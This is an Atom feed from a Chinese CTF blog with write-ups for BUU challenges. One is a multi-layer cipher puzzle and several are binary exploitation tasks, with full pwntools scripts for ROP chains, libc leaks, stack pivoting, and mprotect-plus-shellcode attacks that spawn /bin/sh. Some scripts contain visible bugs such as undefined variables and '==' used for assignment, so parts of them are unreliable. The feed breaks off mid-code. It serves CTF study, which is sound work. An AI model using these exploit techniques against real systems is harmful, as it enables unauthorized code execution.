<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://cc-nianchu.github.io</id>
    <title>nianchu</title>
    <updated>2022-09-28T11:15:12.529Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://cc-nianchu.github.io"/>
    <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
    <subtitle>nianchu的blog</subtitle>
    <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
    <icon>https://cc-nianchu.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, nianchu</rights>
    <entry>
        <title type="html"><![CDATA[buu 的 WUSTCTF2020 佛说：只能四天]]></title>
        <id>https://cc-nianchu.github.io/post/buu-de-wustctf2020-fo-shuo-zhi-neng-si-tian/</id>
        <link href="https://cc-nianchu.github.io/post/buu-de-wustctf2020-fo-shuo-zhi-neng-si-tian/">
        </link>
        <updated>2022-09-28T03:29:47.000Z</updated>
        <content type="html"><![CDATA[<h4 id="下载附件后得到三个附件">下载附件后得到三个附件</h4>
<p>hint.txt:</p>
<pre><code>1. 虽然有点不环保，但hint好像是一次性的，得到后就没有利用价值了。
2. 凯撒不是最后一步，by the way，凯撒为什么叫做凯撒？
</code></pre>
<p>题目.txt:</p>
<pre><code>尊即寂修我劫修如婆愍闍嚤婆莊愍耨羅嚴是喼婆斯吶眾喼修迦慧迦嚩喼斯願嚤摩隸所迦摩吽即塞願修咒莊波斯訶喃壽祗僧若即亦嘇蜜迦須色喼羅囉咒諦若陀喃慧愍夷羅波若劫蜜斯哆咒塞隸蜜波哆咤慧聞亦吽念彌諸嘚嚴諦咒陀叻咤叻諦缽隸祗婆諦嚩阿兜宣囉吽色缽吶諸劫婆咤咤喼愍尊寂色缽嘚闍兜阿婆若叻般壽聞彌即念若降宣空陀壽愍嚤亦喼寂僧迦色莊壽吽哆尊僧喼喃壽嘚兜我空所吶般所即諸吽薩咤諸莊囉隸般咤色空咤亦喃亦色兜哆嘇亦隸空闍修眾哆咒婆菩迦壽薩塞宣嚩缽寂夷摩所修囉菩阿伏嘚宣嚩薩塞菩波吶波菩哆若慧愍蜜訶壽色咒兜摩缽摩諦劫諸陀即壽所波咤聞如訶摩壽宣咤彌即嚩蜜叻劫嘇缽所摩闍壽波壽劫修訶如嚩嘇囉薩色嚤薩壽修闍夷闍是壽僧劫祗蜜嚴嚩我若空伏諦念降若心吽咤隸嘚耨缽伏吽色寂喃喼吽壽夷若心眾祗喃慧嚴即聞空僧須夷嚴叻心願哆波隸塞吶心須嘇摩咤壽嘚吶夷亦心亦喃若咒壽亦壽囑囑
</code></pre>
<p>题目描述.txt：</p>
<pre><code>圣经分为《旧约全书》和《新约全书》
</code></pre>
<p>因为看到题目里面是佛语</p>
<p>一开始就认为是**<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅 </a>**加密解密</p>
<p>然后 显示 是无法解密</p>
<p>根据题目描述:</p>
<p>圣经分为《旧约全书》和《新约全书》</p>
<p>我就想到去<a href="http://hi.pcmoe.net/buddha.html">新约佛论禅/佛曰加密</a>加密解密</p>
<p>然后输入密语解密得：</p>
<pre><code>平等文明自由友善公正自由诚信富强自由自由平等民主平等自由自由友善敬业平等公正平等富强平等自由平等民主和谐公正自由诚信平等和谐公正公正自由法治平等法治法治法治和谐和谐平等自由和谐自由自由和谐公正自由敬业自由文明和谐平等自由文明和谐平等和谐文明自由和谐自由和谐和谐平等和谐法治公正诚信平等公正诚信民主自由和谐公正民主平等平等平等平等自由和谐和谐和谐平等和谐自由诚信平等和谐自由自由友善敬业平等和谐自由友善敬业平等法治自由法治和谐和谐自由友善公正法治敬业公正友善爱国公正民主法治文明自由民主平等公正自由法治平等文明平等友善自由平等和谐自由友善自由平等文明自由民主自由平等平等敬业自由平等平等诚信富强平等友善敬业公正诚信平等公正友善敬业公正平等平等诚信平等公正自由公正诚信平等法治敬业公正诚信平等法治平等公正友善平等公正诚信自由公正友善敬业法治法治公正公正公正平等公正诚信自由公正和谐公正平等
</code></pre>
<p>发现这是 <a href="https://atool.vip/corevalue/">社会主义核心价值观编码器</a></p>
<p>输入密语解密得：</p>
<pre><code>RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence
</code></pre>
<p>观察最后那句话doyouknowfence很明显是一句“出题人留下的线索”</p>
<p>然后我们去试试栅栏密码  每组字数一个个试  经过测试很明显 当字数为4每组时</p>
<p>得的的解密语</p>
<pre><code>R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar
</code></pre>
<p>可以观察到后面跟上面一样 有“出题人留下的线索”</p>
<p>doyouknowcaesar</p>
<p>然后通过hint 凯撒为什么叫凯撒</p>
<p>是因为	一开始凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息  也是通过位移3来传递</p>
<p>所以通过凯撒密码 解密得</p>
<pre><code>O5RXIZRSGAZDA63ONFPWQYLPL54GSYLOM5PXQ2LBNZTV6ZDBL53W67I
</code></pre>
<p>一开始觉得解出来的思路是错误的  因为感觉解出来没有任何提示而且很奇怪  后面看到提示说凯撒密码不是最后一步  说明我们还要继续解密</p>
<p>可以观察到 上列密语 只有A-Z和数字2-5  因此我们可以尝试一下base32（当时做题的时候没想到这个 后面看wp才知道）</p>
<p>然后通过base32解密</p>
<p>得：</p>
<pre><code>  wctf2020{ni_hao_xiang_xiang_da_wo}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[不更新怕被删博客]]></title>
        <id>https://cc-nianchu.github.io/post/bu-geng-xin-pa-bei-shan-bo-ke/</id>
        <link href="https://cc-nianchu.github.io/post/bu-geng-xin-pa-bei-shan-bo-ke/">
        </link>
        <updated>2021-12-02T05:57:02.000Z</updated>
        <content type="html"><![CDATA[<h1 id=""></h1>
<p>最近特别少写题，就来buu按顺序一题一题刷下去吧<br>
##buu PicoCTF_2018_rop_chain</p>
<h3 id="-2"></h3>
<p>一题简单的ROP，32位系统且开了Partial和NX保护</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
 int v4; // [esp+Ch] [ebp-Ch]

 setvbuf(_bss_start, 0, 2, 0);
 v4 = getegid();
 setresgid(v4, v4, v4);
 vuln();
 return 0;
}

</code></pre>
<pre><code>char *vuln()
{
 char s[24]; // [esp+0h] [ebp-18h] BYREF

 printf(&quot;Enter your input&gt; &quot;);
 return gets(s);
}
</code></pre>
<p>一层一层走下去发现有gets()函数，看到这个函数基本上就可以判定是栈溢出，没有限制长度，看看有没有后门函数或者是Sys函数</p>
<pre><code>int __cdecl flag(int a1)
{
  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
  FILE *stream; // [esp+3Ch] [ebp-Ch]
  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  if ( !stream )
  {
    puts(
      &quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;);
    exit(0);
  }
  fgets(s, 48, stream);
  if ( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )
    return printf(&quot;%s&quot;, s);
  if ( win1 &amp;&amp; win2 )
    return puts(&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;);
  if ( win1 || win2 )
    return puts(&quot;Nice Try! You're Getting There!&quot;);
  return puts(&quot;You won't get the flag that easy..&quot;);
}
void win_function1()
{
  win1 = 1;
}
int __cdecl win_function2(int a1)
{
  int result; // eax
  result = (unsigned __int8)win1;
  if ( win1 &amp;&amp; a1 == -1163220307 )
  {
    win2 = 1;
  }
  else if ( win1 )
  {
    result = puts(&quot;Wrong Argument. Try Again.&quot;);
  }
  else
  {
    result = puts(&quot;Nope. Try a little bit harder.&quot;);
  }
  return result;
}
</code></pre>
<p>发现只要在fun2中a1==-559039827且fun1中a1=-1163220307<br>
exp:</p>
<pre><code>from pwn import*

q=remote('node4.buuoj.cn',29409)
#q=process('./PicoCTF_2018_rop_chain')

fun1=0x080485CB
fun2=0x080485D8
flag=0x0804862B

payload='a'*0x1c
payload+=p32(fun1)
payload+=p32(fun2)
payload+=p32(flag)+p32(0xBAAAAAAD)+p32(0XDEADBAAD)

q.sendline(payload)
q.interactive()
</code></pre>
<p>因为a1等于的是负数，所以得让他变成16进制的补码</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[基础泄漏libc  buu]]></title>
        <id>https://cc-nianchu.github.io/post/ji-chu-xie-lou-libc-buu/</id>
        <link href="https://cc-nianchu.github.io/post/ji-chu-xie-lou-libc-buu/">
        </link>
        <updated>2021-11-04T06:22:24.000Z</updated>
        <content type="html"><![CDATA[<p>checksec得 64位系统+NX保护<br>
<img src="https://cc-nianchu.github.io/post-images/1636007024609.png" alt="" loading="lazy"><br>
main函数选择</p>
<pre><code>int begin()
{
  puts(&quot;====================================================================&quot;);
  puts(&quot;1.Encrypt&quot;);
  puts(&quot;2.Decrypt&quot;);
  puts(&quot;3.Exit&quot;);
  return puts(&quot;Input your choice!&quot;);
}
</code></pre>
<p>查看1函数<img src="https://cc-nianchu.github.io/post-images/1636007075011.png" alt="" loading="lazy"><br>
发现这是一道加密题，无system函数也无binsh无libc，发现有gets()溢出点，发现可以利用的函数puts，很明显一道libc题<br>
exp</p>
<pre><code>from pwn import*
from LibcSearcher import*

q=remote('node4.buuoj.cn',25762)
elf=ELF('./ciscn_2019_c_1')

main_add=0x400B28
ret_add=0x4006b9
pop_rdi=0x400c83

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

q.recvuntil(&quot;choice!\n&quot;)
q.sendline('1')

payload ='\0'+'a'*(0x50-1+8)                //绕过字符串判断
payload +=p64(pop_rdi)
payload +=p64(puts_got)
payload +=p64(puts_plt)
payload +=p64(main_add)

q.recvuntil('encrypted\n')
q.sendline(payload)

q.recvline()
q.recvline()

puts_add=u64(q.recvuntil('\n')[:-1].ljust(8,'\0'))
print hex(puts_addr)

libc=LibcSearcher('puts',puts_addr)
offset=puts_addr-libc.dump('puts')
binsh=offset+libc.dump('str_bin_sh')
system=offset+libc.dump('system')

q.recvuntil('choice\n')
q.sendline('1')

payload ='\0'+'a'*(0x50-1+8)                //绕过字符串判断
payload +=p64(ret_add)                      //ubuntu18 栈对齐
payload +=p64(pop_rdi)
payload +=p64(binsh)
payload +=p64(system)

q.recvuntil('encrypted\n')
q.sendline(payload)
q.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[泄漏libc+栈迁移]]></title>
        <id>https://cc-nianchu.github.io/post/xie-lou-libczhan-qian-yi/</id>
        <link href="https://cc-nianchu.github.io/post/xie-lou-libczhan-qian-yi/">
        </link>
        <updated>2021-09-21T10:42:04.000Z</updated>
        <content type="html"><![CDATA[<p>先得到附件     先checksec一下，发现是64位程序且有NX保护<br>
<img src="https://cc-nianchu.github.io/post-images/1632221270879.png" alt="" loading="lazy"><br>
然后我们运行一下这个文件<br>
<img src="https://cc-nianchu.github.io/post-images/1632221389732.png" alt="" loading="lazy"><br>
发现只有一次简单的输入而且给了一个地址，我们打开ida64看main函数。<br>
<img src="https://cc-nianchu.github.io/post-images/1632221481613.png" alt="" loading="lazy"><br>
发现main函数中 printf（buf)的基址已经有read函数，溢出了0x10.这意味着我们想构造rop链应该不行，因为长度不够，我们得另想办法，而且开了NX保护无法执行shellcode<br>
找sys函数且shift+F12无法找到sys函数已经/bin/sh函数<br>
于是我想到泄漏libc，然后我发现了puts函数，利用思路是栈溢出后利用puts函数打印出任何函数的地址，然后返回main函数再次进行利用<br>
利用 puts_plt 把 puts 函数的GOT表项打出来，然后回到main。<br>
这样子我们就可以泄漏出libc了<br>
libc_base=puts_addr -libc.symbols['put']<br>
以及我们想要的sys_addr=libc_base+libc.symbols['system']<br>
首先思路是这样的没错，但是我们很快就会发现0x10长度无法够我们泄漏libc，那我们得栈迁移，将栈迁移到buf前方。<br>
<img src="https://cc-nianchu.github.io/post-images/1632317862822.png" alt="" loading="lazy"></p>
<p>payload的构造：先填充8个字符，因为在64位系统的时候栈迁移会让rsp迁移到rbp+8的位置，这时候rsp会自动加8，所以我们要填充8个字节，pop_rdi会将pop放在rdi寄存器，然后利用put函数，参数放put_got，返回地址为main函数，然后填充&quot;a&quot;*(0xd0-len(payload)填充到p64(buf_addr)。最后的p64(leave)就是栈迁移的知识，leave相当于是mov rsp,rbp; pop rbp;，把rbp的值放到rsp，之后栈顶就是buf-8了，再pop rbp，就把buf-8给了rbp，所以执行完后<br>
如图：<img src="https://cc-nianchu.github.io/post-images/1632317941072.png" alt="" loading="lazy"><br>
然后就可以正常的执行我们构造的gadget片段了<br>
栈结构如图<br>
<img src="https://cc-nianchu.github.io/post-images/1632318017076.png" alt="" loading="lazy"><br>
泄露出了libc我们就可以利用system函数了，找到/bin/sh字符串地址<br>
puts_addr = u64(p.recv(6).ljust(8,'\x00'))<br>
libc_base = puts_addr - libc.symbols['puts']<br>
sys_addr = libc_base + libc.symbols['system']<br>
sh_addr = libc_base + next(libc.search('/bin/sh'))<br>
再次接收printf的地址<br>
leak_addr=int(p.recv(14),16)<br>
然后重新构造一个gadget片段执行system（/bin/sh)<br>
payload = 'a'<em>8+p64(pop_rdi)+p64(sh_addr)+p64(ret)+p64(sys_addr)<br>
payload += 'a'</em>(0xd0-len(payload))+p64(leak_addr)+p64(leave)</p>
<p>exp如下:</p>
<pre><code>from pwn import *
#from LibcSearcher import *

context.log_level = 'debug'
context.arch = 'amd64'

r = process(&quot;./1&quot;)
elf = ELF('./1')
libc= elf.libc
puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']
main = 0x00400577
pop_rdi = 0x00400663
leave = 0x0004005F8
address = int(p.recv(14),16)
addr = int(address,16)
print(addr)
#gdb.attach(r)

payload =  'a'*8
payload += p64(pop_rdi)
payload += p64(puts_got_addr)
payload += p64(puts_plt_addr)
payload += p64(main)
payload += b'A'*0xa8
payload += p64(addr)
payload += p64(leave)
#gdb.attach(r)
r.send(payload)
#gdb.attach(r)

puts_addr = u64(p.recv(6).ljust(8,'\x00'))
libc_base = puts_addr - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
sh_addr = libc_base + next(libc.search('/bin/sh'))

leak_addr=int(p.recv(14),16)

payload =  'a'*8
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(main)
payload += b'A'*0xa8
payload += p64(leak_addr)
payload += p64(leave)

r.send(payload)


r.interactive()
</code></pre>
<p>第二题：<br>
拿到附件checksec</p>
<pre><code>[*] '/home/nianchu/Desktop/zhaoxinti/2'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>发现64位系统且开了nx保护，打开ida64，查看函数<br>
发现一个后门函数</p>
<pre><code>int success()
{
  puts(&amp;s);
  return system(&quot;/bin/sh&quot;);
}
</code></pre>
<p>会return 到system（&quot;/bin/sh&quot;)<br>
所以我们只需要找到溢出点然后返回到后门函数就行<br>
main函数：</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v5; // [rsp+Ch] [rbp-24h] BYREF
  int v6; // [rsp+10h] [rbp-20h]
  int v7; // [rsp+14h] [rbp-1Ch]
  char v8[8]; // [rsp+18h] [rbp-18h] BYREF
  void (*v9)(void); // [rsp+20h] [rbp-10h]
  unsigned __int64 v10; // [rsp+28h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  init();
  v7 = 0;
  v5 = 0;
  v6 = 1;
  puts(&amp;byte_400988);
  puts(a1);
  __isoc99_scanf((__int64)&amp;unk_400A87, (__int64)&amp;v5);
  while ( v6 )
  {
    if ( v5 == 1 )
    {
      puts(&amp;byte_400A90);
      system(&quot;poweroff&quot;);
      v6 = 0;
    }
    else if ( v5 == 2 )
    {
      puts(&amp;byte_400AC8);
      v6 = 0;
    }
    else
    {
      puts(&amp;byte_400B18);
      __isoc99_scanf((__int64)&amp;unk_400A87, (__int64)&amp;v5);
    }
  }
  puts(&amp;byte_400B40);
  puts(&amp;byte_400C08);
  fflush(stdin);
  puts(&amp;byte_400C4A);
  __isoc99_scanf((__int64)&amp;unk_400C5D, (__int64)v8);
  v9();
  return __readfsqword(0x28u) ^ v10;
}
</code></pre>
<p>main函数很长，但是我们发现第一次输入1就是关机，输入2会有一串字符串然后再会输入一次，并且发现v8【8】且下面有一个v9()并且v9是指针，点进去v8发现</p>
<pre><code>0000000000000024 var_24          dd ?
-0000000000000020 var_20          dd ?
-000000000000001C var_1C          dd ?
-0000000000000018 var_18          db 8 dup(?)
-0000000000000010 var_10          dq ?
-0000000000000008 var_8           dq ?
</code></pre>
<p>v8再 var_18但是v9在var_10，所以我们填充8个字符加返回地址变可以 cat flag了<br>
exp：</p>
<pre><code># -*- coding: UTF-8 –*-

from pwn import *
r=process('./2')
r.recvuntil('2.绑定系统开启重回巅峰之路')

r.sendline('2')
payload=p64(0xdeafbeef)+p64(0x400759)

r.recv()
r.sendline(payload)
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[每日1+（认怂了）]]></title>
        <id>https://cc-nianchu.github.io/post/mei-ri-1ren-song-liao/</id>
        <link href="https://cc-nianchu.github.io/post/mei-ri-1ren-song-liao/">
        </link>
        <updated>2021-08-03T14:40:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="buu-ciscn_2019_n_5">buu ciscn_2019_n_5</h2>
<p>在buu上拿到附件 checksec一下</p>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<p>发现这是64位系统 没开任何保护<br>
打开ida64  找到main函数按F5获得伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char text[30]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;tell me your name&quot;);
  read(0, name, 0x64uLL);
  puts(&quot;wow~ nice name!&quot;);
  puts(&quot;What do you want to say to me?&quot;);
  gets(text);
  return 0;
}
</code></pre>
<p>发现第一次让我们输入名字 然后限制长度为0x64  并且name是在.bss段上<br>
第二次是利用gets函数，没有限制长度，可以用gets函数进行溢出<br>
我们得思路是:<br>
第一个漏洞写入shellcode<br>
然后第二个漏洞溢出去到name参数去然后执行shellcode拿到shell<br>
exp:</p>
<pre><code>from pwn import*

q=remote('node4.buuoj.cn',25042)

q.sendlineafter('tell me your name',asm(shellcraft.sh()))

payload='a'*0x28+p64(0x601080)
q.sendlineafter('What do you want to say to me?',payload)

q.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[每日3+]]></title>
        <id>https://cc-nianchu.github.io/post/mei-ri-3/</id>
        <link href="https://cc-nianchu.github.io/post/mei-ri-3/">
        </link>
        <updated>2021-08-01T13:36:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="the-first-titleget_started_3dsctf_2016">the first title:get_started_3dsctf_2016</h2>
<p>拿到附件先checksec get_started_3dsctf_2016</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>发现这是32位系统开了NX保护打开ida32</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp+4h] [ebp-38h] BYREF

  printf(&quot;Qual a palavrinha magica? &quot;, v4[0]);
  gets(v4);
  return 0;
}
void __cdecl get_flag(int a1, int a2)
{
  int v2; // esi
  unsigned __int8 v3; // al
  int v4; // ecx
  unsigned __int8 v5; // al

  if ( a1 == 814536271 &amp;&amp; a2 == 425138641 )
  {
    v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;);
    v3 = getc(v2);
    if ( v3 != 255 )
    {
      v4 = (char)v3;
      do
      {
        putchar(v4);
        v5 = getc(v2);
        v4 = (char)v5;
      }
      while ( v5 != 255 );
    }
    fclose(v2);
  }
}
</code></pre>
<p>在这里看到main函数是可以进行溢出的，而且有get_flag的函数，就是通过main函数溢出到返回地址的时候直接溢出到if条件判断里面。<br>
原本以为就是单纯一个很简单的溢出+后门函数但是上了EXP之后一直无法拿到flag很觉得很奇怪然后上了百度。。<br>
<img src="https://cc-nianchu.github.io/post-images/1627825028037.jpg" alt="" loading="lazy"><br>
我一开始的exp:</p>
<pre><code>from pwn import*

#q = process('./get_started_3dsctf_2016')
q=remote(&quot;node4.buuoj.cn&quot;,25415)

payload = 'a'*56
payload += p32(0x080489B8)
q.sendline(payload)
q.interactive()
</code></pre>
<p>然后上了百度看到一个博主说打远程时候如果程序是异常退出的话最后是不给你回显的。所以我们得想办法让程序正常退出。<br>
有2种方法:<br>
第一种办法:<br>
不绕过if判断返回地址溢出变成带参数<br>
答案是可以的，大概就是这么布局：'a'*溢出量 + 'ebp' + get_flag + get_flag的返回地址 + 参数1 + 参数2<br>
exp:</p>
<pre><code>from pwn import *
q = remote('node4.buuoj.cn',25415)
#q = process('./get_started_3dsctf_2016')
payload = 'a'*56
payload += p32(0x080489A0) + p32(0x0804E6A0)
payload += p32(0x308CD64F) + p32(0x195719D1)
q.sendline(payload)
q.interactive()
</code></pre>
<p>这种是可以拿到flag的，但是我发现别的大佬都是给.bss赋值给权限然后再.bss访问。<br>
有这么一个函数，mprotect，我们先来学习一下。</p>
<p>int mprotect(const void *start, size_t len, int prot);</p>
<p>第一个参数填的是一个地址，是指需要进行操作的地址。</p>
<p>第二个参数是地址往后多大的长度。</p>
<p>第三个参数的是要赋予的权限。</p>
<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
<p>1）PROT_READ：表示内存段内的内容可写；</p>
<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
<p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
<p>prot=7 是可读可写可执行<br>
需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。<br>
EXP:如下</p>
<pre><code>from pwn import *
q = remote('node4.buuoj.cn',25415)
#q = process('./get_started_3dsctf_2016')
context.log_level = 'debug'

mprotect = 0x0806EC80
buf = 0x80ea000
pop_3_ret = 0x0804f460
read_addr = 0x0806E140

payload = 'a'*56
payload += p32(mprotect)
payload += p32(pop_3_ret)
payload += p32(buf)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(read_addr)
payload += p32(buf)
payload += p32(0)
payload += p32(buf)
payload += p32(0x100)
q.sendline(payload)

shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
q.sendline(shellcode)

q.interactive()
</code></pre>
<p>一道题花费了3个多小时，发现自己是真的菜！！！</p>
<h2 id="the-second-titlenot_the_same_3dsctf_2016buu">the second title:not_the_same_3dsctf_2016(buu)</h2>
<p>在buu上拿到附件，然后打开ubuntu checksec 一下</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>发现开了NX保护，32位系统，打开ida32</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF

  printf(&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;);
  gets(v4);
  return 0;
}
int get_secret()
{
  int v0; // esi

  v0 = fopen(&quot;flag.txt&quot;, &amp;unk_80CF91B);
  fgets(&amp;fl4g, 45, v0);
  return fclose(v0);
}
</code></pre>
<p>发现gets()函数，可以进行溢出，然后覆盖返回地址去读出flag，然后利用get_secret函数的输入点造成溢出然后覆盖返回地址到write函数的地址，打印出unk_80CF91B里的flag的内容。。但是做不出来<br>
然后被迫看wp,发现fgets的用法的时候，发现它能够避免造成溢出，而且fl4g在bss段，没有ret指令可以继续控制程序。<br>
然后用mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell，这题的做法跟get_started_3dsctf_2016这题类似<br>
由于需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8</p>
<pre><code> ROPgadget --binary not_the_same_3dsctf_2016 --only &quot;pop|ret&quot;|grep pop
</code></pre>
<p>EXP:</p>
<pre><code>from pwn import*

r=remote('node4.buuoj.cn',25899)
elf=ELF('not_the_same_3dsctf_2016')
read_addr=elf.symbols['read']
mprotect=0x806ED40
addr=0x80eb000
p3_ret=0x806fcc8

shellcode=asm(shellcraft.sh())

payload  ='a'*0x2d+p32(mprotect)+p32(p3_ret)
payload +=p32(addr)+p32(0x100)+p32(0x7)

payload +=p32(read_addr)+p32(p3_ret)

payload +=p32(0)+p32(addr)+p32(len(shellcode))+p32(addr)

r.sendline(payload)
r.sendline(shellcode)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[每日3+道题，之前被迫出门7天正式回归]]></title>
        <id>https://cc-nianchu.github.io/post/mei-ri-3dao-ti-zhi-qian-bei-po-chu-men-7-tian-zheng-shi-hui-gui/</id>
        <link href="https://cc-nianchu.github.io/post/mei-ri-3dao-ti-zhi-qian-bei-po-chu-men-7-tian-zheng-shi-hui-gui/">
        </link>
        <updated>2021-07-31T12:58:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="the-first-titleciscn_2019_n_8">the first title:ciscn_2019_n_8</h2>
<p>好久没做题了 先刷刷buu<br>
上来给了附近  拿到附近先checksec</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<p>发现这是 32位程序 并且开了各种各样的保护<br>
打开ida32拉入文件 F5一键伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts(&quot;What's your name?&quot;);
  __isoc99_scanf(&quot;%s&quot;, var, v4, v5);
  if ( *(_QWORD *)&amp;var[13] )
  {
    if ( *(_QWORD *)&amp;var[13] == 17LL )
      system(&quot;/bin/sh&quot;);
    else
      printf(
        &quot;something wrong! val is %d&quot;,
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf(&quot;%s, Welcome!\n&quot;, var);
    puts(&quot;Try do something~&quot;);
  }
  return 0;
}
</code></pre>
<p>很明显  发现这条语句</p>
<pre><code>if ( *(_QWORD *)&amp;var[13] == 17LL )
      system(&quot;/bin/sh&quot;);
</code></pre>
<p>意思就是只需要(_QWORD *)&amp;v[13] ==17<br>
并且是QWORD 这是8字节的意思 这题就是图一乐，解题<br>
EXP如下:</p>
<pre><code>from pwn import*

#q=process('./ciscn_2019_n_8')
q = remote(&quot;node4.buuoj.cn&quot;,28263)

payload =='sbsb'*13+p32(0x11)+p32(0)
q.sendline(payload)
q.interactive()
</code></pre>
<p>这里奉上flag{b3b5aa9f-c456-487a-9907-b25cf6cd0fef}</p>
<h2 id="the-second-titlejarvisoj_tell_me_something">the second title:jarvisoj_tell_me_something</h2>
<p>给了附件<br>
直接用unbuntu ctrl+alt+T打开终端 checksec一下</p>
<pre><code>    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>发现只开了NX保护<br>
打开ida64 F5获得伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-88h] BYREF

  write(1, &quot;Input your message:\n&quot;, 0x14uLL);
  read(0, &amp;v4, 0x100uLL);
  return write(1, &quot;I have received your message, Thank you!\n&quot;, 0x29uLL);
}
</code></pre>
<p>很简洁的一道题，我们发现有write和read函数，可以看出read函数有栈溢出<br>
并且发现了一个good_name函数</p>
<pre><code>int good_game()
{
  FILE *v0; // rbx
  int result; // eax
  char buf[9]; // [rsp+Fh] [rbp-9h] BYREF

  v0 = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  while ( 1 )
  {
    result = fgetc(v0);
    buf[0] = result;
    if ( (_BYTE)result == 0xFF )
      break;
    write(1, buf, 1uLL);
  }
  return result;
}
</code></pre>
<p>就是经典的栈溢出然后返回到后门函数的题目<br>
然后点开v4发现有0x88的位置<br>
EXP如下:</p>
<pre><code>from pwn import*

#q=process(./guestbook)
q=remote(&quot;node4.buuoj.cn&quot;,28416)

door_addr=0x400620
payload='a'*0x88+p64(door_addr)
q.sendline(payload)

q.interactive()
</code></pre>
<p>flag如下：flag{0931ff4c-afd4-4cb2-a673-1d55027682ce}</p>
<h2 id="the-third-titleciscn_2019_ne_5">the third title:ciscn_2019_ne_5</h2>
<p>buu上的题目  拿到附件先checksec</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>发现这是32位程序  打开ida32</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-100h] BYREF
  char src[4]; // [esp+4h] [ebp-FCh] BYREF
  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
